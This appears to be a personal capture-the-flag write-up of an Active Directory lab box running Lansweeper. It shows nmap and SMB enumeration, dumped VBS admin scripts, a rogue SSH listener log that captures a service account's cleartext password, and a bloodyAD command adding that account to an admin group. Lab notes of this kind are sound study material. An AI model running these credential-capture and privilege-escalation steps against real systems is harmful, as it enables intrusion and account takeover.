

```python
kali@kali ~> nmap -sC -sV 10.129.158.164
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 04:11 UTC
Nmap scan report for 10.129.158.164
Host is up (0.069s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
81/tcp   open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: 
|_Requested resource was /UpgradeInProgress.aspx?action=schema
82/tcp   open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-title: 
|_Requested resource was /UpgradeInProgress.aspx?action=schema
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=Lansweeper Secure Website
| Subject Alternative Name: DNS:localhost, DNS:localhost, DNS:localhost
| Not valid before: 2021-11-21T09:22:27
|_Not valid after:  2121-12-21T09:22:27
|_http-trane-info: Problem with XML parsing of /evox/about
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-08-20 04:11:21Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: sweep.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: sweep.vl0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=inventory.sweep.vl
| Not valid before: 2025-07-27T23:26:33
|_Not valid after:  2026-01-26T23:26:33
|_ssl-date: 2025-08-20T04:12:33+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SWEEP
|   NetBIOS_Domain_Name: SWEEP
|   NetBIOS_Computer_Name: INVENTORY
|   DNS_Domain_Name: sweep.vl
|   DNS_Computer_Name: inventory.sweep.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-20T04:11:51+00:00
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: Host: INVENTORY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 

```



```
kali@kali ~> nxc smb sweep.vl -u 'a' -p '' --shares
SMB         10.129.158.164  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.158.164  445    INVENTORY        [+] sweep.vl\a: (Guest)
SMB         10.129.158.164  445    INVENTORY        [*] Enumerated shares
SMB         10.129.158.164  445    INVENTORY        Share           Permissions     Remark
SMB         10.129.158.164  445    INVENTORY        -----           -----------     ------
SMB         10.129.158.164  445    INVENTORY        ADMIN$                          Remote Admin
SMB         10.129.158.164  445    INVENTORY        C$                              Default share
SMB         10.129.158.164  445    INVENTORY        DefaultPackageShare$ READ            Lansweeper PackageShare
SMB         10.129.158.164  445    INVENTORY        IPC$            READ            Remote IPC
SMB         10.129.158.164  445    INVENTORY        Lansweeper$                     Lansweeper Actions
SMB         10.129.158.164  445    INVENTORY        NETLOGON                        Logon server share 
SMB         10.129.158.164  445    INVENTORY        SYSVOL                          Logon server share 
```


```
kali@kali ~/.n/m/n/1/D/Scripts> cat CopyFile.vbs 
'this script takes 2 arguments => "Source" and "Destination" and uses this to copy a the file
Source = WScript.Arguments.Item(0)
Destination = WScript.Arguments.Item(1)

Set fso = CreateObject("Scripting.FileSystemObject")
'Check to see if the file already exists in the destination folder
If fso.FileExists(Destination) Then
        'Check to see if the file is read-only
        If Not fso.GetFile(Destination).Attributes And 1 Then 
                        fso.CopyFile Source, Destination, True
        Else 
                'The file exists and is read-only.
                fso.GetFile(Destination).Attributes = fso.GetFile(Destination).Attributes - 1
                        fso.CopyFile Source, Destination, True
        End If
Else
                fso.CopyFile Source, Destination, True
End If
Set fso = Nothing

```


```
kali@kali ~/.n/m/n/1/D/Scripts> cat Wallpaper.vbs 
'this script takes 2 arguments ("Source a Destination") 
Source = WScript.Arguments.Item(0)
Destination = WScript.Arguments.Item(1)

Const HKEY_LOCAL_MACHINE = &H80000001
strComputer = "."
Set StdOut = WScript.StdOut
Set oShell = Wscript.CreateObject("WScript.Shell")
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")


Set fso = CreateObject("Scripting.FileSystemObject")
'Check to see if the file already exists in the destination folder
If fso.FileExists(Destination) Then
        'Check to see if the file is read-only
        If Not fso.GetFile(Destination).Attributes And 1 Then 
                        fso.CopyFile Source, Destination, True
        Else 
                'The file exists and is read-only.
                fso.GetFile(Destination).Attributes = fso.GetFile(Destination).Attributes - 1
                        fso.CopyFile Source, Destination, True
        End If
Else
                fso.CopyFile Source, Destination, True
End If
Set fso = Nothing

strKeyPath = "Control Panel\Desktop"
strValueName = "WallPaper"
strValue = Destination
oReg.SetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,strValue

RegCommandValue = "RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True"
ReturnVal = oShell.Run (RegCommandValue, 1, True)⏎ 
```


```
Dim  reg, objRegistry
Dim SN, M, ValueName, strComputer
Const HKLM = &H80000002
strComputer = "."

Set reg = GetObject("winmgmts:\\" & strComputer & "\root\default:StdRegProv")

on error resume next
If WScript.Arguments.count = 0 Then

        Set objRegistry = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2").ExecQuery("Select * FROM      Win32_OperatingSystem")
        For Each object In objRegistry
                SN = object.SerialNumber 
        Next 

        Set objRegistry = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2").ExecQuery("Select * FROM      Win32_ComputerSystem")
        For Each object In objRegistry
                M = object.Model
        Next 

        value = M & ": " & SN
        key = "SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
        ValueName = "srvcomment"

        If Len(value) > 48 Then value = Left(value, 48)
        reg.SetStringValue HKLM, key, ValueName, value
Else
        value = WScript.Arguments(0)
        key = "SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
        ValueName = "srvcomment"
        reg.SetStringValue HKLM, key, ValueName, value
End if

```



scripts are empty and RID bruteforcing leads to finding out the intern user exists, the intern users password is their username and then we get our first peek into the lansweeper




```
^C⏎                                                                                                                                                                                                                                          kali@kali ~/t/sshesame (master) [SIGINT]> ./sshesame -config sample.yaml
INFO 2025/08/20 10:27:50 No host keys configured, using keys at "/home/kali/.local/share/sshesame"
INFO 2025/08/20 10:27:50 Listening on 10.8.4.215:2022
WARNING 2025/08/20 10:27:55 Failed to accept connection: Failed to establish SSH server connection: EOF
WARNING 2025/08/20 10:27:59 Failed to accept connection: Failed to establish SSH server connection: ssh: disconnect, reason 11: Session closed
2025/08/20 10:28:00 [10.10.124.188:50231] authentication for user "svc_inventory_lnx" without credentials rejected
2025/08/20 10:28:00 [10.10.124.188:50231] authentication for user "svc_inventory_lnx" with password "0|5m-U6?/uAX" accepted
2025/08/20 10:28:00 [10.10.124.188:50231] connection with client version "SSH-2.0-RebexSSH_5.0.8372.0" established
2025/08/20 10:28:00 [10.10.124.188:50231] [channel 0] session requested
2025/08/20 10:28:00 [10.10.124.188:50231] [channel 0] command "uname" requested
2025/08/20 10:28:00 [10.10.124.188:50231] [channel 0] closed
2025/08/20 10:28:00 [10.10.124.188:50231] connection closed
2025/08/20 10:28:00 [10.10.124.188:50232] authentication for user "svc_inventory_lnx" without credentials rejected
2025/08/20 10:28:00 [10.10.124.188:50232] authentication for user "svc_inventory_lnx" with password "0|5m-U6?/uAX" accepted
2025/08/20 10:28:00 [10.10.124.188:50232] connection with client version "SSH-2.0-RebexSSH_5.0.8372.0" established
2025/08/20 10:28:00 [10.10.124.188:50232] [channel 0] session requested
2025/08/20 10:28:01 [10.10.124.188:50232] [channel 0] PTY using terminal "xterm" (size 80x25) requested
2025/08/20 10:28:01 [10.10.124.188:50232] [channel 0] shell requested
2025/08/20 10:28:01 [10.10.124.188:50232] [channel 0] input: "smclp"
2025/08/20 10:28:01 [10.10.124.188:50232] [channel 0] input: "show system1"

```



```
kali@kali ~ [2]> bloodyAD --host 10.10.124.188 -d sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX' add groupMember 'LANSWEEPER ADMINS' svc_inventory_lnx
[+] svc_inventory_lnx added to LANSWEEPER ADMINS
```


```

```








----

mistakes

# Mistakes

didnt enumerate or try harder on the website, completely forgetting it exists, i know the subdomain exists but i didnt even try to enumerate it. completely ignore the web part essentially fucked me and I forgot to do RID bruteforcing